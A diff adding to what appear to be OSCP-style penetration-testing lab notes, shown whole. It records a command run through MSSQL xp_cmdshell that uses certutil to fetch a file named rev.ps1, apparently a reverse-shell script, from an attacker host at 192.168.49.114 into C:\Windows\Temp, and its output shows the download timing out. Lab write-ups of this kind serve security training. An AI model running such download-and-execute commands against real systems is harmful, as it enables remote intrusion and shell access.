@@ -113,3 +113,24 @@ NULL
 SQL (OSCP\svc_sql  dbo@master)> 
 
 ```
+
+```
+certutil.exe -urlcache -f http://192.168.49.114:8000/rev.ps1 C:\Windows\Temp\rev.ps1
+
+output:
+
+SQL (OSCP\svc_sql  dbo@master)> EXEC xp_cmdshell 'certutil.exe -urlcache -f http://192.168.49.114:8000/rev.ps1 C:\Windows\Temp\rev.ps1';
+output                                                                                  
+-------------------------------------------------------------------------------------   
+****  Online  ****                                                                      
+
+NULL                                                                                    
+
+NULL                                                                                    
+
+CertUtil: -URLCache command FAILED: 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)   
+
+CertUtil: The operation timed out                                                       
+
+NULL    
+```
